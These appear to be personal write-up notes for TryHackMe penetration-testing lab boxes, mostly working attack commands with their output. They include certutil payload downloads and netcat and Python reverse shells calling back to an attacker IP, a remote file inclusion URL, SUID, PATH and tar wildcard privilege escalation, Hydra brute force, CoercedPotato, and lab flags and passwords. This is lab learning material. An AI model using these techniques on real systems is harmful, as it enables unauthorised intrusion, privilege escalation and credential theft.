# Penetration Test THM Pathway
![hacker](oscp.png)
Following notes I took facing some challange\box, so these are not properly write-up\walkthrough, often just an aspect is covered (e.g. privilege escalation). I took the notes since I discovered new tactics, sometime reading someone else blog or article, or just because I liked the exploitation path.

## Vulnversity
### Priv escalation
Find SUID files on the victim
  
    find / -perm -u=s -type f 2>/dev/null
    /usr/bin/newuidmap
    ...
    /bin/systemctl
     ...

On the attacker create the following service configuration file as service01.phtml

    [Unit]
    Description=Service 01
    
    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'cat /root/root.txt'
    
    [Install]
    WantedBy=multi-user.target

Upload the file using the form to the victim, (http://10.10.13.154:3333/internal/), then perform the following steps:

    cd /var/www/html/internal/uploads
    mv service01.phtml service01.service
    /bin/systemctl enable /var/www/html/internal/uploads/service01.service
      Created symlink from /etc/systemd/system/multi-user.target.wants/service01.service to /var/www/html/internal/uploads/service01.service.
      Created symlink from /etc/systemd/system/service01.service to /var/www/html/internal/uploads/service01.service.
Start the service:

    /bin/systemctl status service01
Check the execution to get the flag: a58ff8579f0a9270368d33a9966c7fd5

    /bin/systemctl status service01
    * service01.service - Service 01
       Loaded: loaded (/var/www/html/internal/uploads/service01.service; enabled; vendor preset: enabled)
       Active: inactive (dead) since Mon 2024-04-29 06:38:29 EDT; 1min 4s ago
      Process: 12889 ExecStart=/bin/bash -c cat /root/root.txt (code=exited, status=0/SUCCESS)
     Main PID: 12889 (code=exited, status=0/SUCCESS)
    
    Apr 29 06:38:29 vulnuniversity systemd[1]: Started Service 01.
    Apr 29 06:38:29 vulnuniversity bash[12889]: a58ff8579f0a9270368d33a9966c7fd5

## Kenobi
### Priv escalation
Search SUID file

    find / -perm -u=s -type f 2>/dev/null
    ...
    /usr/bin/menu
    ...

Check readable strings inside the file

    strings /usr/bin/menu 
      []A\A]A^A_
      ***************************************
      1. status check
      2. kernel version
      3. ifconfig
      ** Enter your choice :
      curl -I localhost
      uname -r
      ifconfig
       Invalid choice
      ;*3$"

The menu calls 3 commands: curl, kernel, ifconfig, without specifing the full path. This allows us to create a malicious version of once of the executed commands, e.g. ifconfig.
Inspecting the PATH enviroment variable:

    echo $PATH
      /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
We can see that current user bin directory is in the PATH, so we can just create our malicious version of ifconfig inside the user's home bin directory:

     pwd
      /home/kenobi
    mkdir bin
    cd bin
    echo "cat /root/root.txt" > ifconfig
    chmod ugo+x ifconfig 
Executing the command we get an access error since we don't have the permission to read the flag:

      ifconfig 
      cat: /root/root.txt: Permission denied
    
But if we call it using the menu command interface we get the flag:

    kenobi@kenobi:~$ menu
    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :3
    177b3cd8562289f37382721c28381f02

## Alfred
### Execute DOS command in jenkins
1. In a project, select configure, Scroll down to the Buil section, insert your command there: download netcat from the attacker machine and verify

       certutil -urlcache -split -f "http://10.9.0.171:8000/nc64.exe" "nc64.exe"   && dir
2. Build the project (it will take a while since nc has tobe downloaded)
3. Then select the first entry in the Build history section
4. Then click Console output and you should see something similar:

        Started by user admin
        Running as SYSTEM
        Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
        [project] $ cmd /c call C:\Users\bruce\AppData\Local\Temp\jenkins2706411477596705408.bat
        
        C:\Program Files (x86)\Jenkins\workspace\project>certutil -urlcache -split -f "http://10.9.0.171:8000/nc64.exe" "nc64.exe"     && dir
        ****  Online  ****
          0000  ...
          b0d8
        CertUtil: -URLCache command completed successfully.
         Volume in drive C has no label.
         Volume Serial Number is E033-3EDD
        
         Directory of C:\Program Files (x86)\Jenkins\workspace\project
        
        04/30/2024  10:37 AM    <DIR>          .
        04/30/2024  10:37 AM    <DIR>          ..
        04/30/2024  10:37 AM            45,272 nc64.exe
                       2 File(s)      4,908,760 bytes
                       2 Dir(s)  20,509,741,056 bytes free
        
        C:\Program Files (x86)\Jenkins\workspace\project>exit 0 
        Finished: SUCCESS


Then we can repeat the previous steps, change the command (1) to get a reverse shell:

    nc64.exe 10.9.0.171 1234 -e cmd.exe

Build again the project and you should get a reverse shell on your attacker machine
    
### Priv esc using incognito standalone
https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe

Download from the victim:

     certutil -urlcache -split -f "http://10.9.0.171:8000/incognito.exe" "incognito.exe" 
    
Now we can list the available tokens:

    incognito.exe list_tokens -u 
    [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
    [*] Enumerating tokens
    [*] Listing unique users found
    
    Delegation Tokens Available
    ============================================
    alfred\bruce 
    IIS APPPOOL\DefaultAppPool 
    NT AUTHORITY\IUSR 
    NT AUTHORITY\LOCAL SERVICE 
    NT AUTHORITY\NETWORK SERVICE 
    NT AUTHORITY\SYSTEM 
    
    Impersonation Tokens Available
    ============================================
    NT AUTHORITY\ANONYMOUS LOGON 
    
    Administrative Privileges Available
    ============================================
    SeAssignPrimaryTokenPrivilege
    SeCreateTokenPrivilege
    SeTcbPrivilege
    SeTakeOwnershipPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeDebugPrivilege
    SeImpersonatePrivilege
    SeRelabelPrivilege
    SeLoadDriverPrivilege

Since we cannot use none of the available delegation tokens, we can try to add a user to local administrator using incognito:

    incognito.exe add_user catwoman Pwd1234! && incognito.exe add_localgroup_user Administrators catwoman 
    ...
    [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
    [*] Enumerating tokens
    [*] Attempting to add user catwoman to host 127.0.0.1
    [+] Successfully added user
    [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
    [*] Enumerating tokens
    [*] Attempting to add user catwoman to local group Administrators on host 127.0.0.1
    [+] Successfully added user to local group

Checl it out:

   
    net user catwoman
    User name                    catwoman
    Full Name                    catwoman
    ...
    Local Group Memberships      *Administrators       


Now since RDP is enabled we can access alfred as catwoman user (set tls-seclevel:0 to avoid tls connection error)

    xfreerdp /u:"alfred\catwoman" /v:10.10.36.188 /tls-seclevel:0

    
## HackPark
I created a more stable [reverse shell](HackPark/PostView.ascx) using nc to exploit CVE-2019-6714.

## GameZone
### Privilege escalation without metasploit 
I used the Python script: https://github.com/JohnHammond/CVE-2012-2982/tree/master.
Supposing you have the SSH tunnel activated on your attacker box on localhost:10000

     python CVE-2012-2982.py -t localhost -p 10000 -U agent47 -P videogamer124 -c "cat /root/root.txt > flag.txt"     
      [+] targeting host localhost on port 10000
      [+] successfully logged in with user 'agent47' and pw 'videogamer124'
      [+] executed 'cat /root/root.txt > flag.txt' on 'localhost'

Search for the file on the victim SSH session 

    agent47@gamezone:~$ find / -name flag.txt 2>/dev/null
      /usr/share/webmin/file/flag.txt
Get the flag

    agent47@gamezone:~$ cat /usr/share/webmin/file/flag.txt
      a4b945830144bdd71908d12d902adeee

## Skynet
Map smb share

    smbmap -H 10.10.18.58
    ...  
                                                                                                    
    [+] IP: 10.10.18.58:445 Name: 10.10.18.58               Status: Authenticated
            Disk                                                    Permissions     Comment
            ----                                                    -----------     -------
            print$                                                  NO ACCESS       Printer Drivers
            anonymous                                               READ ONLY       Skynet Anonymous Share
            milesdyson                                              NO ACCESS       Miles Dyson Personal Share
            IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

We can access the anonymous share only:

    smbclient \\\\10.10.18.58\\anonymous 
    Password for [WORKGROUP\zinz]:
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Thu Nov 26 17:04:00 2020
      ..                                  D        0  Tue Sep 17 09:20:17 2019
      attention.txt                       N      163  Wed Sep 18 05:04:59 2019
      logs                                D        0  Wed Sep 18 06:42:16 2019

                9204224 blocks of size 1024. 5831512 blocks available
    smb: \> get attention.txt 
    getting file \attention.txt of size 163 as attention.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
    smb: \> cd logs\
    smb: \logs\> ls
      .                                   D        0  Wed Sep 18 06:42:16 2019
      ..                                  D        0  Thu Nov 26 17:04:00 2020
      log2.txt                            N        0  Wed Sep 18 06:42:13 2019
      log1.txt                            N      471  Wed Sep 18 06:41:59 2019
      log3.txt                            N        0  Wed Sep 18 06:42:16 2019
    
                    9204224 blocks of size 1024. 5831512 blocks available
    
    smb: \logs\> get log1.txt 
    getting file \logs\log1.txt of size 471 as log1.txt (1.2 KiloBytes/sec) (average 0.9 KiloBytes/sec)

Search hidden folder on the web server

    ffuf -u http://10.10.18.58/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c

    
       v2.1.0-dev
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://10.10.18.58/FUZZ
     :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
    ________________________________________________

    ...
    admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 70ms]
    css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 75ms]
    js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 72ms]
    config                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 67ms]
    ai                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 67ms]
    squirrelmail            [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 82ms]
                            [Status: 200, Size: 523, Words: 26, Lines: 19, Duration: 67ms]
    server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 67ms]
    :: Progress: [220560/220560] :: Job [1/1] :: 422 req/sec :: Duration: [0:06:50] :: Errors: 0 ::

Visiting /squirrelmail we are redirected to login: /squirrelmail/src/login.php, Proceed to brute-force the login using the password list found it on the anonymous share. I created a possible combination of usernames for Miles Dyson:

    cat miles.txt          
      Miles.Dyson
      Miles-Dyson
      Miles_Dyson
      MilesDyson

Then I proceeded with Hydra:

    hydra -L miles.txt -P log1.txt 10.10.18.58 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:password incorrect"
    ...
    [80][http-post-form] host: 10.10.18.58   login: MilesDyson   password: cyborg007haloterminator

Inspecting the recived email we found the samba password: )s{A&2Z=F^n_E.B`
    
    smbclient \\\\10.10.18.58\\milesdyson -U milesdyson 
    Password for [WORKGROUP\milesdyson]:
    Try "help" to get a list of possible commands.
Download important notes

    smb: \notes\> get important.txt

We can find a CMS: http://{skynet IP}/45kra24zxs28v3yd. Fuzzing the CMS as well:

    ffuf -u http://10.10.18.58/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c 
    ...
    administrator           [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 70ms]

Visiting the administrator URL we are presented to login page of a CUPPA CMS. Tryng both the founded password for Miles Dyson but nothing worked. We can't find the version of CMS, anyway we can search for known vulnerability:

    searchsploit "CUPPA CMS"
      Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion ... php/webapps/25971.txt

We can exploit it as follows:

     http://<skynet IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker IP>/reverse-shell.php

To upgrade the shell to TTY

    python -c 'import pty;pty.spawn("/bin/bash")'
Search for file owned by root

    find /home -user root -name "*.sh" 2>/dev/null
    /home/milesdyson/backups/backup.sh
The file is executed every one minutes

    www-data@skynet:/$ ls -la /home/milesdyson/backups
    ...
    -rw-r--r-- 1 root       root       4679680 May  3 04:56 backup.tgz

    www-data@skynet:/$ ls -la /home/milesdyson/backups
    ...
    -rw-r--r-- 1 root       root       4679680 May  3 04:57 backup.tgz

### Lesson learned: tar wildcard injection privilege escalation 
[Here](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c) is explained very well

Key points are:
1. The script move to a directory
2. Inside this directory (that we have to have  write permission) we created 3 files
3. The 3 files are interpreted as arguments of the command <b>tar cf /home/milesdyson/backups/backup.tgz --checkpoint=1 --checkpoint=action=exec=sh shell.sh</b>

So we proceed as follows:

     cd cd /var/www/html
     # 1
     echo 'cat /root/root.txt > root.txt' > getFlag.sh
     # 2 
     echo "" > "--checkpoint-action=exec=sh getFlag.sh"
     # 3
     echo "" > --checkpoint=1

    ls -la

    total 80
    -rw-rw-rw- 1 www-data www-data     1 May  3 05:20 --checkpoint-action=exec=sh getFlag.sh
    -rw-rw-rw- 1 www-data www-data     1 May  3 05:20 --checkpoint=1
    ...
    -rw-rw-rw- 1 www-data www-data    32 May  3 05:20 getFlag.sh

After a minute we should find the root.txt file containing the flag.

## Daily Bugle
### Find Joomla versiom visit:

    http://10.10.25.244/administrator/manifests/files/joomla.xml
    ...
    <version>3.7.0</version>
      <creationDate>April 2017</creationDate>
      <description>FILES_JOOMLA_XML_DESCRIPTION</description>
    ...

Alternative:

    http://10.10.25.244/README.txt
    ....
    1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
    
Search for exploit:

	searchsploit "Joomla! 3.7"
	....
	Joomla! 3.7 - SQL Injection             php/remote/44227.php

### Exploit Joomla!
Load the php file into your web server with Php enabled (I used ver. 8.2.12), insert the base url: http://joomla.ip. 
The exploit will return the user and the hashed password, the hash type is bcrypt, that corresponds to hashcat mode 3200.

	hashcat.exe -m 3200 -a 0 hash_bcrypt.txt C:\Users\******\wordlist\rockyou.txt

To get a reverse shell, once logged in, navigate to the template and create a new php file, e.g. rs.php. You can call the created file using the following path:

	http://joomla.ip/tamplates/[template-name]/rs.php 
 in my case is:
 
	http://10.10.231.185/templates/beez3/rs.php

Note that this is not the default template used, in this way the exploit will be more difficult to detect. Get a reverse php shell.

### Priv escalation
I created another txt with [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) content, then I searched for the file:

	find /var/www -name linpeas.txt -print
	  /var/www/html/templates/beez3/linpeas.txt
  	mv /var/www/html/templates/beez3/linpeas.txt /var/www/html/templates/beez3/linpeas.sh
   	chmod ugo+x /var/www/html/templates/beez3/linpeas.sh
Then execute it

	/var/www/html/templates/beez3/linpeas.sh
 Found a password

 	╔══════════╣ Searching passwords in config PHP files
	/var/www/html/configuration.php:        public $password = 'nv5uz9r3ZEDzVjNu'

Inspecting the file

 	more /var/www/html/configuration.php
We can read that the password is for mysql root user to access mysql. Try if it reused.
Does not work for root, but work for jjameson. Let's use again linpeas.
                                                                                                                                                                                         
	╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
	╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                         	Matching Defaults entries for jjameson on dailybugle:                                                                                                                                    	...
	User jjameson may run the following commands on dailybugle:
	    (ALL) NOPASSWD: /usr/bin/yum

You can escalate the privilege to get a root shell as illustred [here](https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-2-loading-a-custom-yum-plugin).
Follows the steps and you should get a root shell.

## Overpass 2
To find the hash type used on Kali <b>hash-identifier</b>.
As shown in the source code of the backdoor:

	func hashPassword(password string, salt string) string {
		hash := sha512.Sum512([]byte(password + salt))
		return fmt.Sprintf("%x", hash)
	}
Combine password+salt. The hashcat format is:

	1710	sha512($pass:$salt)
### Privilege escalation
The SUID file to get a shell as root must be executed as follows:

	home/james$ ./.suid_bash -p      
	.suid_bash-4.4# whoami
	root


 ### Trouble shootimg to connect using ssh
 Problem: no matching host key type found. Their offer: ssh-rsa

 Solution: add the following in your ssh config file, /etc/ssh/ssh_config

 	HostKeyAlgorithms = +ssh-rsa
	PubkeyAcceptedAlgorithms = +ssh-rsa
Once terminated with this box undo the action since it is insecure

## Relevant
### Scan the services

	nmap -A -sVC -T4 10.10.153.188 -v
 ### Enumerate SMB

 	smbclient -L 10.10.153.188

        Sharename       Type      Comment
        ---------       ----      -------
        ....
        nt4wrksv        Disk      

 	
  Connect to the share without password
  
  	smbclient //10.10.153.188/nt4wrksv
	...
	smb: \> ls
	  .                                   D        0  Sat Jul 25 23:46:04 2020
	  ..                                  D        0  Sat Jul 25 23:46:04 2020
	  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

                7735807 blocks of size 4096. 4950430 blocks available

	smb: \> get passwords.txt 
### Decode passwords

	echo -n 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
### Attack
The credentials did not work for psexec neither for RDP. Since I was stuck at this point, I enumerated again searching for other services:

	nmap -p- 10.10.153.188 -v
	...
 	49663/tcp open  unknown
	49667/tcp open  unknown
	49669/tcp open  unknown

Identify the new discovered services:

	nmap -sVC -T4 10.10.153.188 -p 49663 49667 49669 -v
	....
 	PORT      STATE SERVICE VERSION
	49663/tcp open  http    Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows Server
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Brute force directory

	ffuf -u http://10.10.153.188:49663/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301 -c
	...
 	nt4wrksv                [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 72ms]

Check if it is the shared folder we found before is actually mapped on the webserver: http://10.10.157.7:49663/nt4wrksv/passwords.txt.
Then we can upload a reverse shell:

	smb: \> put shell.aspx 
	putting file shell.aspx as \shell.aspx (36.6 kb/s) (average 36.6 kb/s)

 Then visit: http://10.10.157.7:49663/nt4wrksv/shell.aspx. Once you get the shell check privileges:

 	whoami /priv

	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                               State   
	============================= ========================================= ========
	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
	...
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

Since <b>SeImpersonatePrivilege</b> is enabled we can escalate out privileges using some <i>Potatoes :)</i>, I used [CoercedPotato](https://github.com/hackvens/CoercedPotato) since it is one of most simple to use it and should works even on the most recent windows OS (11 and 22):

 	smb: \> put CoercedPotato.exe 
	putting file CoercedPotato.exe as \CoercedPotato.exe (168.4 kb/s) (average 147.5 kb/s)

Then we can execute the following command to get a shell as system:

	C:\inetpub\wwwroot\nt4wrksv>.\CoercedPotato.exe -c cmd.exe
        ...						     
                                                                  
	[+] RUNNING ALL KNOWN EXPLOITS.
	
	[PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe \\.\pipe\YrRlvc\pipe\spoolss.
	[PIPESERVER] Named pipe '\\.\pipe\YrRlvc\pipe\spoolss' listening...
	
	[MS-RPRN] [*] Attempting MS-RPRN functions...
	
	[MS-RPRN] Starting RPC functions fuzzing...
	 [MS-RPRN] [*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: \\127.0.0.1/pipe/YrRlvc
	
	[PIPESERVER] A client connected!
	
	 ** Exploit completed **
	
	Microsoft Windows [Version 10.0.14393]
	(c) 2016 Microsoft Corporation. All rights reserved.
	
	C:\Windows\system32>whoami
	whoami
	nt authority\system

If you did not know (like me) the subject of this exploit I suggest to read the following posts:
1. This explain how to take advantage of the named pipes, the same principle applies on CoercedPotato too:
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges.
2. Here you can check which <i>potatoes</i> still works at the moment (05.2024): 
https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all

## Internal
### Scan
Using rustscan to perform a fast all port scan

	rustscan -a internal.thm -b 1000 
	
	Open 10.10.213.134:22
	Open 10.10.213.134:80
	...
	Scanned at 2024-05-08 11:27:55 CEST for 0s
	
	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack ttl 63
	80/tcp open  http    syn-ack ttl 63

The you can check vulnerabilities with nmap

	nmap -sVC -A -v internal.thm -Pn -p 80 22 --script vuln

 ### Privilege escalation
 Search for password or credentials (whole disk, takes very long)

 	grep -Ril "password\|CredentiaL" /home /etc /opt /var/www 2>/dev/null
	.... 
  	/opt/wp-save.txt
	....
We found aubreanna:bubb13guM!@#123 then we can connect using SSH.

### Lateral movement
I used ligolo-ng instead of SSH tunnell. We found a Jenkins server

	cat jenkins.txt 
	Internal Jenkins service is running on 172.17.0.2:8080
I added the route to the ligolo interface

 	sudo ip route add 172.17.0.2/32 dev ligolo 

Then scan the host

	rustscan -a 172.17.0.2 -b 1000 
	...
 	Open 172.17.0.2:8080
	Open 172.17.0.2:50000
	...

Brute-force Jenkins login form:

	hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid"
	...
 	[8080][http-post-form] host: 172.17.0.2   login: admin   password: spongebob
	...
 In Jenkis create a test build project, then in configure, add a build action -> execute shell command:

  	#!/bin/bash
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.67",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

Since python 2.7 is enabled we use it to get a reverse shell, just build the project.

### Get root
Again we search for juicy information:

	 grep -Ril "password\|CredentiaL" /home /etc /opt /var/www 2>/dev/null
	...
	/etc/services
	/opt/note.txt

See note and login as root

	ssh root@internal.thm
 	
## Buffer Overflow Prep
Manual practice the first to challenge (Overflow1 and Overflow2), then you can auotomate it with this fantastic [tool](https://github.com/zinzloun/Buffer-Overflow-Assistant) -> To be merged

 	
